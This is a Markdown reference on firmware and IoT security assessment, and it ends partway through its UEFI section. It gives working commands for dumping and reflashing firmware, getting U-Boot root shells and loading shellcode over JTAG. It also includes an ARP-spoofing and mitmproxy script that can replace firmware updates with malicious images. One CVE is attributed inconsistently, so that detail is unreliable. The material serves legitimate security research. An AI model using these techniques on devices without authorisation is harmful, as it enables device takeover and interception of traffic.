# Firmware & IoT Security Reference

> Comprehensive reference for IoT/firmware security assessment, exploitation techniques, defensive hardening, and compliance standards. Covers hardware hacking, firmware analysis, UEFI/BIOS security, IoT protocols, and industry frameworks.

---

## Table of Contents

1. [IoT/Firmware Attack Surface](#1-iotfirmware-attack-surface)
2. [Firmware Extraction](#2-firmware-extraction)
3. [Firmware Analysis Tools](#3-firmware-analysis-tools)
4. [UEFI/BIOS Security](#4-uefibios-security)
5. [IoT Protocol Security](#5-iot-protocol-security)
6. [Hardware Interface Testing](#6-hardware-interface-testing)
7. [Common IoT Vulnerability Classes](#7-common-iot-vulnerability-classes)
8. [IoT Security Testing Methodology](#8-iot-security-testing-methodology)
9. [IoT Security Standards](#9-iot-security-standards)
10. [Defensive IoT Security](#10-defensive-iot-security)

---

## 1. IoT/Firmware Attack Surface

### 1.1 System-on-Chip (SoC) Architecture

Modern IoT devices are built around SoCs that integrate CPU, memory, peripherals, and radio interfaces into a single die. The attack surface begins at silicon level.

**Common IoT SoC Families:**

| Vendor | SoC Series | Architecture | Common Use |
|--------|-----------|--------------|------------|
| Qualcomm | IPQ4018/4019/8064 | ARM Cortex-A7/A15 | Home routers (TP-Link, Netgear) |
| MediaTek | MT7621/MT7628 | MIPS 1004Kc | Entry-level routers |
| Realtek | RTL8197/RTL8881 | MIPS | Budget routers/cameras |
| Broadcom | BCM4708/BCM47189 | ARM Cortex-A9 | Premium routers (ASUS, Netgear) |
| Marvell | Armada 370/388 | ARM v7 | NAS devices |
| Allwinner | H3/H5/A64 | ARM Cortex-A7/A53 | Single-board computers |
| Espressif | ESP8266/ESP32 | Xtensa LX6/LX7 | Embedded IoT sensors |
| Nordic | nRF52840 | ARM Cortex-M4 | BLE devices |
| Texas Instruments | CC2652 | ARM Cortex-M4 | Zigbee/Thread |

**SoC Attack Vectors:**
- **Debug interface exposure**: JTAG/SWD pins left accessible on PCB
- **Bootloader configuration**: U-Boot `bootargs` manipulation via UART
- **Trusted Execution Environment (TEE)**: ARM TrustZone exploitation (CVE-2019-9506, OP-TEE vulns)
- **Secure element bypass**: Fault injection to skip secure boot verification
- **Memory-mapped I/O**: Direct hardware register manipulation via /dev/mem

### 1.2 Flash Memory Attack Vectors

**Flash Memory Types in IoT:**

| Type | Interface | Capacity | Common Use |
|------|-----------|----------|------------|
| NOR Flash | SPI/Parallel | 1-128 MB | Bootloader + firmware |
| NAND Flash | SPI/Parallel | 64 MB-32 GB | Linux rootfs, data |
| eMMC | MMC/SDIO | 4-256 GB | Full OS (higher-end) |
| LPDDR/DDR | Parallel | 64 MB-2 GB | RAM (volatile) |

**Flash Attack Scenarios:**
- **Direct chip read**: Desolder SPI flash → read with programmer (CH341A, Bus Pirate)
- **In-circuit SPI dump**: Clip directly onto flash chip using SOIC-8 test clip
- **Firmware modification**: Patch binaries in extracted filesystem, reflash
- **eMMC extraction**: Remove eMMC, mount on SD adapter or solder wires
- **Wear-leveling artifacts**: Recover deleted files from NAND flash raw dumps

### 1.3 UART Attack Vectors

Universal Asynchronous Receiver-Transmitter (UART) is the most commonly exposed debug interface. Present on >80% of consumer IoT devices.

**Attack Capabilities via UART:**
- Boot log capture (kernel messages, filesystem mounts, service startups)
- U-Boot shell access (pre-OS, full hardware control)
- Linux root shell (if console=ttyS0 and no password)
- Kernel parameter modification (`init=/bin/sh`, `rdinit=/bin/sh`)
- Memory dump via `/dev/mem` or kernel module

**Typical UART Exposure Pattern:**
```
[1.234] Starting kernel...
[1.890] Mounting rootfs...
[2.456] Starting busybox...
Hit any key to stop autoboot: 3
U-Boot>
```

### 1.4 JTAG Attack Vectors

Joint Test Action Group (JTAG) provides low-level CPU debugging and boundary scan capabilities.

**JTAG Capabilities:**
- Halt CPU execution at arbitrary points
- Read/write all CPU registers
- Read/write physical memory (RAM, flash-mapped regions)
- Set hardware breakpoints and watchpoints
- Bypass software security checks
- Extract encryption keys from RAM during runtime

**SWD (Serial Wire Debug):** ARM-specific 2-wire variant of JTAG, common on Cortex-M microcontrollers. Same capabilities with fewer pins.

### 1.5 RF Attack Vectors

**Wireless Protocol Attack Surface:**

| Protocol | Frequency | Key Attacks |
|----------|-----------|-------------|
| Wi-Fi 802.11 | 2.4/5 GHz | WPA2 PMKID capture, KRACK (CVE-2017-13077), Evil Twin |
| Bluetooth/BLE | 2.4 GHz | KNOB (CVE-2019-9506), BIAS (CVE-2020-10135), passive sniff |
| Zigbee | 2.4 GHz | Key extraction, replay attacks, KillerBee toolkit |
| Z-Wave | 908.42 MHz | S0 encryption downgrade, replay |
| LoRa/LoRaWAN | 868/915 MHz | Join replay, bit-flip attacks on payload |
| 433/315 MHz | Sub-GHz | Replay attacks on garage doors, sensors |
| NFC/RFID | 13.56 MHz | Card cloning, relay attacks, Proxmark3 |
| LTE-M/NB-IoT | Cellular | IMSI catcher, SS7 attacks |

### 1.6 Firmware Types

**Bare Metal Firmware:**
- Runs directly on hardware, no OS abstraction
- Single execution context, no process isolation
- Common in microcontrollers (Arduino, STM32, ESP8266 non-RTOS)
- Attack focus: stack overflows, integer overflows, hardcoded credentials in binary
- Analysis: IDA Pro/Ghidra with SVD-Loader for register definitions

**Real-Time Operating System (RTOS) Firmware:**
- FreeRTOS, Zephyr, ThreadX, VxWorks, QNX, uC/OS
- Task scheduling, memory management, IPC
- VxWorks: Used in critical infrastructure, many CVEs (CVE-2019-12255 through 12264 "URGENT/11")
- FreeRTOS: CVE-2018-16522 through 16528 (heap/stack overflows)
- Analysis: Identify RTOS by binary signatures, use RTOS-aware debugger

**Linux-Based Firmware:**
- Full Linux kernel + userspace (BusyBox, uClibc/musl/glibc)
- OpenWrt, DD-WRT, custom vendor builds
- Attack surface: web interface, SSH, Telnet, SNMP, UPnP, TR-069
- Analysis: binwalk extraction → standard Linux tools on filesystem

### 1.7 OWASP IoT Top 10

| Rank | Category | CVE Examples | Description |
|------|----------|--------------|-------------|
| I1 | Weak/Guessable/Hardcoded Passwords | CVE-2016-1000245 | Default/hardcoded credentials |
| I2 | Insecure Network Services | CVE-2019-7192 | Unnecessary open ports, insecure protocols |
| I3 | Insecure Ecosystem Interfaces | CVE-2020-25506 | Web/API/mobile/cloud interfaces lack security |
| I4 | Lack of Secure Update Mechanism | CVE-2021-20090 | No signature verification on firmware updates |
| I5 | Use of Insecure/Outdated Components | CVE-2022-26134 | Third-party components with known vulns |
| I6 | Insufficient Privacy Protection | N/A | Personal data not protected adequately |
| I7 | Insecure Data Transfer/Storage | CVE-2019-9494 | Plaintext transmission, unencrypted storage |
| I8 | Lack of Device Management | N/A | No asset management, update policy |
| I9 | Insecure Default Settings | CVE-2021-35003 | Unnecessary features enabled by default |
| I10 | Lack of Physical Hardening | N/A | Physical access enables compromise |

### 1.8 IoT Botnet Threat Landscape

**Mirai (2016):**
- Infected 600,000+ devices; conducted 1.2 Tbps DDoS against Dyn DNS
- Exploitation: Telnet brute force with 62 hardcoded credential pairs
- Target: IP cameras, DVRs, routers running BusyBox Linux
- CVEs exploited: Multiple default credential issues, CVE-2016-6277 (Netgear)
- Variants: Okiru, Satori, Masuta, PureMasuta, OMG, Wicked, Miori

**Mozi (2019-2023):**
- P2P botnet using DHT protocol for C2 (no centralized server)
- Exploited 9 router vulnerabilities: CVE-2014-2321, CVE-2017-17215, CVE-2018-10561
- Peak infection: 1.5 million devices
- Capabilities: DDoS, data collection, command execution
- Takedown: September 2023 (Chinese authorities, ISP cooperation)

**VPNFilter (2018):**
- State-sponsored (attributed to Sandworm/Russia) router malware
- Three-stage architecture: persistent loader → core C2 module → plugins
- Stage 2 capabilities: file exfiltration, command execution, device destruction
- Stage 3 plugins: Ssler (HTTPS MITM, credential harvest), ps (port scanner)
- Affected: Linksys, MikroTik, Netgear, TP-Link, QNAP (500,000+ devices)
- CVEs: CVE-2018-5767 (Tenda), multiple router vulns

**BlackMatter/REvil IoT (2021+):**
- Ransomware operators pivoting to industrial/IoT networks
- Target: OT networks accessible via poorly secured IoT gateways

---

## 2. Firmware Extraction

### 2.1 SPI Flash Dumping with flashrom

**Hardware Required:**
- CH341A USB programmer (~$5) or Bus Pirate v3/v4
- SOIC-8 test clip for in-circuit reading
- Logic level shifter if device uses 1.8V flash (most modern routers)

**Identify Flash Chip:**
```bash
# Look for chip markings: Winbond (W25Q), Macronix (MX25L), GigaDevice (GD25Q)
# Example: W25Q128JV = 128Mbit (16MB) SPI NOR flash

# flashrom supports 400+ chips
flashrom --programmer ch341a_spi -V  # Verbose: detect chip
```

**In-Circuit SPI Dump (Device Powered Off):**
```bash
# Identify chip on PCB (usually 8-pin SOIC near CPU)
# Attach SOIC-8 clip to chip
# Connect clip to CH341A

# Probe and identify chip
flashrom -p ch341a_spi

# Read firmware (full chip dump)
flashrom -p ch341a_spi -r firmware_dump.bin

# Verify with second read
flashrom -p ch341a_spi -r firmware_dump2.bin
md5sum firmware_dump.bin firmware_dump2.bin  # Must match

# Write modified firmware
flashrom -p ch341a_spi -w modified_firmware.bin
```

**Bus Pirate SPI Dump:**
```bash
# Connect Bus Pirate:
# MOSI -> DI (pin 5), MISO -> DO (pin 2), CLK -> CLK (pin 6)
# CS -> CS (pin 1), 3.3V -> VCC (pin 8), GND -> GND (pin 4)

flashrom -p buspirate_spi:dev=/dev/ttyUSB0,spispeed=1M -r dump.bin

# For 1.8V flash, use level shifter between Bus Pirate 3.3V and chip 1.8V
# Or use Dediprog SF100/SF600 (supports 1.8V natively)
```

**flashrom Voltage Warning:**
```bash
# CRITICAL: Many modern routers use 1.8V flash
# CH341A outputs 3.3V — can destroy 1.8V flash chips
# Check datasheet before connecting
# Use 1.8V adapter board or Dediprog for safety
```

**Partial Flash Operations:**
```bash
# Read specific region (e.g., U-Boot at start of flash)
flashrom -p ch341a_spi -r uboot.bin --layout layout.txt --image uboot

# layout.txt format:
# 00000000:0003ffff uboot
# 00040000:003fffff firmware
```

### 2.2 UART Serial Interface

**Finding UART Pins:**
1. Look for 4-6 pin headers on PCB (often unpopulated)
2. Use multimeter: GND pin reads 0V, TX idles at VCC (3.3V or 5V)
3. Power on device; TX will show voltage fluctuations during boot
4. Use logic analyzer or oscilloscope to confirm baud rate

**Baud Rate Detection:**
```bash
# Method 1: Use baudrate.py (automatic detection)
pip install pyserial
python baudrate.py /dev/ttyUSB0

# Method 2: Try common baud rates
# 115200 (most common), 57600, 38400, 19200, 9600

# Method 3: Logic analyzer measurement
# Measure shortest pulse width = 1/baud_rate
# 8.68 microseconds = 115200 baud

# Method 4: minicom or screen
screen /dev/ttyUSB0 115200
minicom -D /dev/ttyUSB0 -b 115200
```

**Boot Log Capture:**
```bash
# Connect: TX(device) -> RX(USB-serial), RX(device) -> TX(USB-serial), GND -> GND
# DO NOT connect device TX to host TX — will damage adapter

# Capture complete boot log
minicom -D /dev/ttyUSB0 -b 115200 -C bootlog.txt

# Or with picocom
picocom -b 115200 /dev/ttyUSB0 --logfile bootlog.txt

# Useful information in boot log:
# - Kernel version and build date
# - Filesystem mounts (squashfs, jffs2, ubifs)
# - Service startup errors
# - Network interface initialization
# - Potential credential hints
```

**U-Boot Interruption Procedure:**
```bash
# U-Boot displays countdown: "Hit any key to stop autoboot: 3"
# Press any key within countdown window (usually 1-3 seconds)

# Once at U-Boot prompt (=>):

# Print environment variables (reveals boot commands, IP addresses)
printenv

# Dump flash to RAM and export via TFTP
tftp 0x80000000 test  # Test TFTP connectivity
md 0x80000000 0x100   # Memory display (hex dump)

# Boot with modified kernel parameters (root shell)
setenv bootargs "console=ttyS0,115200 root=/dev/mtdblock2 init=/bin/sh"
boot

# Or: boot directly into single user mode
setenv bootargs "${bootargs} single"
bootm ${kernel_addr}

# Load new firmware via TFTP
setenv serverip 192.168.1.100
setenv ipaddr 192.168.1.1
tftp 0x80000000 firmware.bin
erase 0x9f040000 +0x7c0000
cp.b 0x80000000 0x9f040000 0x7c0000
reset

# Dump entire flash via TFTP (firmware extraction without desoldering)
cp.b 0x9f000000 0x80000000 0x1000000  # Copy flash to RAM
tftp 0x80000000 dump.bin              # Send RAM to TFTP server
```

**U-Boot Environment Exploitation:**
```bash
# Many devices store credentials in U-Boot environment
printenv | grep -i pass
printenv | grep -i user

# Modify boot to enable Telnet/SSH
setenv enable_telnet 1
saveenv
reset
```

### 2.3 JTAG/SWD with OpenOCD

**Hardware Adapters:**
- Segger J-Link (professional, $30-$500)
- ST-Link v2 ($3 clone, excellent for STM32/ARM)
- Bus Pirate (slow but universal)
- FTDI FT2232H-based adapters (OpenOCD native support)
- Tigard (open-source multi-protocol debug board)

**OpenOCD Configuration:**
```tcl
# openocd.cfg for BCM4708 (ARM Cortex-A9)
source [find interface/ftdi/openocd-usb.cfg]
source [find target/bcm4708.cfg]

# Or custom config:
interface ftdi
ftdi_device_desc "Dual RS232-HS"
ftdi_vid_pid 0x0403 0x6010

ftdi_layout_init 0x0008 0x000b
ftdi_layout_signal nTRST -data 0x0010 -noe 0x0040
ftdi_layout_signal nSRST -data 0x0020 -noe 0x0080

transport select jtag
reset_config trst_and_srst

set CHIPNAME bcm4708
source [find target/cortex_a.cfg]
```

**OpenOCD Memory Operations:**
```bash
# Start OpenOCD
openocd -f openocd.cfg

# Connect with telnet
telnet localhost 4444

# Halt CPU
halt

# Read memory (dump 0x100 bytes from address 0x80000000)
mdw 0x80000000 0x40    # display words
mdb 0x80000000 0x100   # display bytes

# Write memory
mww 0x80000000 0xdeadbeef  # write word
mwb 0x80000000 0x90         # write byte (NOP instruction)

# Dump memory to file
dump_image /tmp/ram_dump.bin 0x80000000 0x4000000  # 64MB RAM dump

# Load file into memory
load_image /tmp/shellcode.bin 0x80000000

# Set/get registers
reg pc           # program counter
reg sp           # stack pointer
reg r0           # general register

# Breakpoints
bp 0x80012345 4 hw    # hardware breakpoint
rbp 0x80012345        # remove breakpoint

# Step execution
step
continue

# GDB server (port 3333 by default)
# Connect: gdb-multiarch vmlinux -ex "target remote :3333"
```

**SWD Configuration (ARM Cortex-M):**
```tcl
# For nRF52840, STM32, etc.
source [find interface/stlink.cfg]
transport select swd
source [find target/nrf52.cfg]

# Or for STM32F4
source [find interface/stlink.cfg]
source [find target/stm32f4x.cfg]
```

**Extracting Firmware via JTAG:**
```bash
# OpenOCD telnet session
halt
# Map flash memory region (check datasheet for base address)
dump_image firmware_via_jtag.bin 0x08000000 0x100000  # STM32: 1MB flash
# For read-protected devices: fault injection may be needed
```

### 2.4 Chip-Off Procedure

**When to Use:**
- JTAG/UART not accessible
- Device is bricked/won't boot
- Need forensic-grade evidence
- Memory protection prevents in-circuit reading

**Tools Required:**
- Hot air rework station (Hakko FR-810, Quick 861DW)
- Reflow preheater (recommended to reduce thermal stress)
- Flux (no-clean flux pen or paste)
- BGA reball kit (if BGA package)
- Chip programmer (Dediprog, TL866II+, XGecu T48)

**Chip-Off Process:**
```
1. Document PCB layout with high-res photos before removal
2. Apply flux generously around chip
3. Preheat PCB to 150°C to reduce thermal gradient
4. Apply hot air at 350-380°C, circular motion, 5-8cm distance
5. Apply gentle upward pressure with tweezers (do NOT force)
6. Chip lifts when solder fully reflows (~30-60 seconds)
7. Clean pads with solder wick + flux
8. Allow to cool slowly (avoid quenching with air)
9. Mount chip in programmer socket or BGA adapter
10. Read chip contents
```

**Programmer Commands:**
```bash
# TL866II+ with minipro
minipro -p W25Q128JV -r dump.bin    # Read
minipro -p W25Q128JV -w modified.bin -e  # Erase + Write
minipro -p W25Q128JV -m              # Checksum

# For NAND flash (requires specific adapter)
minipro -p MT29F4G08ABADA -r nand_dump.bin
```

### 2.5 Firmware Update MITM with mitmproxy

**Setup:**
```bash
pip install mitmproxy

# Transparent proxy on port 8080
mitmproxy --mode transparent --listen-port 8080

# Or as explicit proxy
mitmproxy -p 8080

# For HTTPS (install mitmproxy CA cert on test device or use --ssl-insecure)
# Configure device to use 192.168.1.100:8080 as proxy
```

**Intercepting Firmware Updates:**
```python
# mitmproxy addon: firmware_intercept.py
from mitmproxy import http
import re

class FirmwareInterceptor:
    def response(self, flow: http.HTTPFlow) -> None:
        # Detect firmware download by URL pattern or content-type
        url = flow.request.pretty_url
        if any(ext in url for ext in ['.bin', '.trx', '.img', '.fw', 'firmware']):
            print(f"[!] Firmware download detected: {url}")
            print(f"    Status: {flow.response.status_code}")
            print(f"    Size: {len(flow.response.content)} bytes")

            # Save firmware
            with open('/tmp/firmware_capture.bin', 'wb') as f:
                f.write(flow.response.content)

            # Optionally replace with modified firmware
            # with open('/tmp/malicious_firmware.bin', 'rb') as f:
            #     flow.response.content = f.read()

addons = [FirmwareInterceptor()]
```

```bash
# Run with addon
mitmproxy -s firmware_intercept.py --mode transparent

# ARP poison device to route traffic through host
arpspoof -i eth0 -t 192.168.1.50 192.168.1.1  # Poison device
arpspoof -i eth0 -t 192.168.1.1 192.168.1.50   # Poison router
echo 1 > /proc/sys/net/ipv4/ip_forward

# iptables redirect to mitmproxy
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080
```

---

## 3. Firmware Analysis Tools

### 3.1 binwalk

binwalk is the primary tool for firmware analysis — it identifies file signatures, compression boundaries, encrypted regions, and embedded filesystems.

**Installation:**
```bash
# Kali Linux (pre-installed)
apt install binwalk

# From source (includes all extractors)
git clone https://github.com/ReFirmLabs/binwalk
cd binwalk && pip install .

# Dependencies for extraction
apt install mtd-utils gzip bzip2 tar arj lhasa p7zip squashfs-tools             zlib1g-dev liblzma-dev liblzo2-dev sleuthkit default-jdk             cpio openjdk-11-jre
```

**Signature Scanning:**
```bash
# Basic signature scan
binwalk firmware.bin

# Example output:
# DECIMAL    HEXADECIMAL  DESCRIPTION
# 0          0x0          U-Boot legacy uImage, ...
# 65536      0x10000      LZMA compressed data, ...
# 1572864    0x180000     Squashfs filesystem, little endian, 4.0

# Scan with verbose output
binwalk -v firmware.bin

# Scan multiple files
binwalk *.bin

# List all supported signatures
binwalk --list
```

**Entropy Analysis:**
```bash
# Entropy analysis (high entropy = encrypted/compressed)
binwalk -E firmware.bin

# Save entropy graph as PNG
binwalk -E -J firmware.bin  # Creates firmware.bin.png

# Entropy interpretation:
# ~0.0 = Empty/padding
# ~0.8 = Compressed data (LZMA, gzip, zstd)
# ~1.0 = Encrypted data (AES, XOR key analysis needed)
# ~0.6-0.7 = Code/data mix
# Peaks/transitions indicate region boundaries
```

**Architecture Detection:**
```bash
# Detect CPU architecture
binwalk -A firmware.bin

# Example output:
# DECIMAL    HEXADECIMAL  DESCRIPTION
# 65536      0x10000      ARM instructions, function epilogue
# 65548      0x1000C      MIPS instructions

# Combined scan
binwalk -BAeE firmware.bin
```

**Extraction:**
```bash
# Extract all identified components
binwalk -e firmware.bin
# Creates _firmware.bin.extracted/ directory

# Extract recursively (embedded archives within archives)
binwalk -Me firmware.bin  # Matryoshka mode

# Extract to specific directory
binwalk -e firmware.bin -C /tmp/extracted/

# Extract specific offset manually
dd if=firmware.bin bs=1 skip=1572864 | unsquashfs -f -d /tmp/rootfs -

# Force extraction even without signature match
binwalk -e --include=0x180000 firmware.bin

# Extract with logging
binwalk -e -l binwalk_log.txt firmware.bin
```

**Filesystem Analysis Post-Extraction:**
```bash
# Navigate extracted filesystem
ls -la _firmware.bin.extracted/
ls -la _firmware.bin.extracted/squashfs-root/

# Find interesting files
find _firmware.bin.extracted/ -name "passwd" -o -name "shadow" 2>/dev/null
find _firmware.bin.extracted/ -name "*.conf" | xargs grep -l "password"
find _firmware.bin.extracted/ -name "*.sh" | xargs grep -l "password"
find _firmware.bin.extracted/ -perm -4000 2>/dev/null  # SUID binaries
find _firmware.bin.extracted/ -name "*.cgi" 2>/dev/null  # Web CGI scripts

# Extract strings from all binaries
find _firmware.bin.extracted/ -type f -exec strings {} \; > all_strings.txt
grep -i "password\|passwd\|secret\|key\|token\|credential" all_strings.txt

# Check for hardcoded IPs/domains
grep -rE "([0-9]{1,3}\.){3}[0-9]{1,3}" _firmware.bin.extracted/etc/
```

**Custom Signatures:**
```bash
# Define custom magic bytes signature
# Create ~/.config/binwalk/magic/custom_sigs:
# 0    string    MYFIRMWARE    My custom firmware format
# >4   lelong    x             Version: %d

binwalk --magic=~/.config/binwalk/magic/custom_sigs firmware.bin
```

### 3.2 Firmware Analysis Toolkit (FAT) / Attify

**FAT by Attify provides automated IoT firmware emulation using QEMU:**

```bash
# Installation
git clone https://github.com/attify/firmware-analysis-toolkit
cd firmware-analysis-toolkit
./setup.sh  # Installs QEMU, Firmadyne, binwalk, required dependencies

# Dependencies
apt install qemu qemu-system-arm qemu-system-mips qemu-system-x86             busybox-static fakeroot git dmsetup kpartx netcat-openbsd             nmap python3-psycopg2
```

**Running FAT:**
```bash
# Basic usage (attempts automatic emulation)
sudo python3 fat.py firmware.bin

# Example workflow output:
# [+] Firmware: firmware.bin
# [+] Extracting with binwalk...
# [+] OS: Linux
# [+] Architecture: mipseb
# [+] Brand: Netgear
# [+] Creating QEMU image...
# [+] Running firmware in QEMU...
# [+] Firmware is accessible at: http://192.168.0.1

# After emulation starts, test with:
curl http://192.168.0.1/
nikto -h http://192.168.0.1/
nmap -sV 192.168.0.1
```

**QEMU Manual Emulation Setup:**
```bash
# For MIPS firmware (big-endian)
qemu-system-mips -M malta -kernel vmlinux-3.2.0-4-4kc-malta     -initrd initrd.img-3.2.0-4-4kc-malta     -drive format=raw,file=rootfs.ext2     -append "root=/dev/sda1"     -net nic -net tap,ifname=tap0,script=no,downscript=no     -nographic

# For ARM firmware
qemu-system-arm -M vexpress-a9 -kernel zImage     -drive if=sd,file=rootfs.ext3     -append "root=/dev/mmcblk0 console=ttyAMA0"     -net nic -net tap -nographic
```

**QEMU User-Mode Chroot Emulation:**
```bash
# Emulate individual binaries without full system emulation
# Useful for testing specific components

# Setup chroot environment
cp $(which qemu-mips-static) _firmware.bin.extracted/squashfs-root/usr/bin/
sudo chroot _firmware.bin.extracted/squashfs-root/ /usr/bin/qemu-mips-static /bin/sh

# Run specific binary in chroot
sudo chroot _firmware.bin.extracted/squashfs-root/ /usr/bin/qemu-mips-static /usr/sbin/httpd

# For ARM binaries
cp $(which qemu-arm-static) _firmware.bin.extracted/squashfs-root/usr/bin/
sudo chroot _firmware.bin.extracted/squashfs-root/ /usr/bin/qemu-arm-static /bin/busybox sh

# Fix library paths if needed
export LD_LIBRARY_PATH=/lib:/usr/lib
sudo chroot . /usr/bin/qemu-mips-static -L /. /usr/sbin/httpd

# Mount required filesystems before chroot
sudo mount --bind /proc _firmware.bin.extracted/squashfs-root/proc
sudo mount --bind /dev _firmware.bin.extracted/squashfs-root/dev
sudo mount --bind /sys _firmware.bin.extracted/squashfs-root/sys
```

### 3.3 Firmadyne — Automated Linux Firmware Emulation

Firmadyne is a systematic platform for automated dynamic analysis of Linux-based embedded firmware.

**Installation:**
```bash
git clone --recursive https://github.com/firmadyne/firmadyne
cd firmadyne

# Install dependencies
sudo apt install busybox-static fakeroot git kpartx netcat-openbsd nmap                  python-psycopg2 python3-psycopg2 snmp uml-utilities                  util-linux vlan

# Download prebuilt kernels
./download.sh

# Setup PostgreSQL
sudo service postgresql start
sudo -u postgres createuser -P firmadyne  # password: firmadyne
sudo -u postgres createdb -O firmadyne firmadyne
sudo -u postgres psql -d firmadyne < ./database/schema

# Configure firmadyne.config
FIRMADYNE_DIR=/path/to/firmadyne
BINARY_DIR=${FIRMADYNE_DIR}/binaries/
SCRATCH_DIR=${FIRMADYNE_DIR}/scratch/
TARBALL_DIR=${FIRMADYNE_DIR}/images/
SQL_SERVER=127.0.0.1
```

**Firmadyne Workflow:**
```bash
# Step 1: Extract firmware
./sources/extractor/extractor.py -b Netgear -sql 127.0.0.1 -np -nk     firmware.bin scratch/

# Step 2: Identify architecture
./scripts/getArch.sh ./scratch/1/

# Step 3: Load filesystem into database
./scripts/tar2db.py -i 1 -f ./scratch/1/*.tar.gz

# Step 4: Create QEMU disk image
sudo ./scripts/makeImage.sh 1

# Step 5: Infer network configuration
./scripts/inferNetwork.sh 1

# Step 6: Run emulated firmware
sudo ./scratch/1/run.sh

# Access emulated firmware
# Check console output for IP address
# Usually accessible at 192.168.0.100 or as reported by inferNetwork
```

**Automated Analysis Scripts:**
```bash
# Check which services are running
./analyses/runExploits.py -q 127.0.0.1 -i 1 -e ./exploits/

# Enumerate network services
nmap -sV -p- 192.168.0.100

# Run against all images in database
psql -U firmadyne -d firmadyne -c "SELECT id FROM image WHERE status='Completed'"
```

### 3.4 Ghidra Flat Binary Loading

**Loading Bare-Metal / Stripped Firmware in Ghidra:**

```
1. File → Import File → firmware.bin
2. Format: Raw Binary (do NOT use auto-detect for flat binaries)
3. Language: Select based on binwalk -A output
   - MIPS (big-endian): MIPS:BE:32:default
   - MIPS (little-endian): MIPS:LE:32:default
   - ARM little-endian: ARM:LE:32:v8
   - ARM Thumb: ARM:LE:32:v8T
   - x86: x86:LE:32:default
   - RISC-V: RISCV:LE:32:RV32IMC
```

**Memory Map Setup:**
```
Window → Memory Map → Add Memory Block
For typical router firmware layout:
- Name: FLASH, Start: 0x9F000000, Length: 0x1000000, R/X
- Name: RAM, Start: 0x80000000, Length: 0x4000000, R/W/X
- Name: MMIO, Start: 0xB8000000, Length: 0x100000, R/W (volatile)

For STM32F4:
- Name: FLASH, Start: 0x08000000, Length: 0x100000, R/X
- Name: SRAM, Start: 0x20000000, Length: 0x20000, R/W/X
- Name: PERIPH, Start: 0x40000000, Length: 0x10000000, R/W

For bare-metal with vector table at 0x00000000:
- Name: VECTORS, Start: 0x00000000, Length: 0x200, R
  Mark as "Entry Point" to let Ghidra find reset handler
```

**Analysis Tips:**
```
Analysis → Auto Analyze → Select:
- ARM Aggressive Instruction Finder (for ARM/Thumb interworking)
- Decompiler Parameter ID
- Non-Returning Functions

For MIPS: Enable "MIPS 16/Micro MIPS" if mixed ISA
For finding strings: Search → For Strings (minimum length 5, ASCII)
For finding crypto: Search → For Scalars matching known constants (AES S-box: 0x63)
```

---

## 4. UEFI/BIOS Security

### 4.1 UEFI PI Phases

The UEFI Platform Initialization (PI) specification defines firmware execution phases:

| Phase | Name | Description | Attack Surface |
|-------|------|-------------|----------------|
| SEC | Security | First code after reset, establishes temporary RAM | Cache-as-RAM (CAR) manipulation |
| PEI | Pre-EFI Initialization | Initializes permanent memory (DRAM) | PEIM attacks, S3 resume vulnerabilities |
| DXE | Driver eXecution Environment | Main firmware driver execution | Malicious DXE drivers, protocol hooks |
| BDS | Boot Device Selection | Selects boot device, loads OS loader | Boot option manipulation |
| TSL | Transient System Load | OS loader execution (GRUB/shim) | Bootloader vulnerabilities |
| RT | Runtime | OS running, Runtime Services still available | SMM attacks, runtime variable tampering |
| AL | After Life | S3/S4/S5 power transitions | S3 resume attacks |

**DXE Phase Attack Details:**
- DXE drivers are loaded from firmware volume (FV) in flash
- Driver authentication via authenticode signatures (if Secure Boot enforced)
- Without Secure Boot: any DXE driver in flash executes as firmware
- Malicious DXE driver can: hook EFI services, install SMM handlers, persist through OS reinstall
- Tool: UEFITool for editing DXE driver modules in firmware images

### 4.2 SMM Rootkits and DXE Driver Attacks

**System Management Mode (SMM):**
- Highest privilege CPU mode (Ring -2)
- Triggered by System Management Interrupt (SMI)
- Executes from SMRAM (memory region locked from OS)
- Used legitimately for power management, hardware abstraction

**SMM Attack Scenarios:**

**SMM Callout (SWSMI Handler Hijack):**
```
1. SMM handler calls out to non-SMRAM memory (violation of SMM security)
2. Attacker modifies code/data in memory referenced by SMM handler
3. Next SMI triggers handler, attacker code runs in Ring -2
CVE-2021-33164: Intel NUC SMM callout via SWSMI
CVE-2020-8703: Multiple Intel platforms
```

**SMRAM Confusion:**
```
DXE driver allocated buffer overlaps SMRAM region
Write to "normal" memory corrupts SMM handler
Execute shellcode with SMM privileges
```

**ThinkPwn (CVE-2016-3699):**
```
Lenovo ThinkPad UEFI SMM callout vulnerability
SMM handler called EFI Runtime Services without proper validation
Allowed unprivileged kernel driver to execute code in SMM
```

**SMM Persistence (ImposterV2 technique):**
```python
# SMM rootkit capabilities:
# 1. Intercept OS disk writes to persist malicious code
# 2. Hook EFI_RUNTIME_SERVICES (GetVariable/SetVariable)
# 3. Exfiltrate memory contents
# 4. Survive OS reinstall and disk wipe
# 5. Only removable by re-flashing firmware
```

### 4.3 efiXplorer — UEFI Analysis Plugin

efiXplorer provides GUID identification, protocol tracking, and SMM vulnerability detection for IDA Pro and Ghidra.

**Installation:**
```bash
# IDA Pro plugin
git clone https://github.com/binarly-io/efiXplorer
cp efiXplorer/efiXplorer.py /path/to/ida/plugins/
cp -r efiXplorer/efiXplorer/ /path/to/ida/plugins/

# Ghidra plugin
# Download efiXplorer-ghidra release JAR
# File → Install Extensions → select JAR
```

**Using efiXplorer in IDA Pro:**
```
1. Open UEFI binary (DXE driver, SMM handler, etc.)
2. Edit → Plugins → efiXplorer
   OR: Ctrl+Alt+E

Output:
- GUID annotations: All protocol GUIDs identified and named
- Protocol usage: gBS->LocateProtocol(), gBS->InstallProtocol() calls labeled
- SMM detection: Highlights SmmGetSmstFromSmm patterns
- Callout detection: Calls from SMM to non-SMRAM memory flagged
- EFI service detection: All EFI_BOOT_SERVICES and EFI_RUNTIME_SERVICES calls named
```

**GUID Identification:**
```python
# efiXplorer uses multiple GUID databases:
# - EDKII (TianoCore) — thousands of protocol GUIDs
# - Lenovo, Dell, HP, AMI, Phoenix vendor GUIDs
# - Custom GUID database support

# Important GUIDs to recognize:
# EFI_SMM_BASE2_PROTOCOL_GUID: {5a90ba11-...} — SMM access
# EFI_SMM_SW_DISPATCH2_PROTOCOL_GUID: {18a3c6dc-...} — SWSMI handler registration
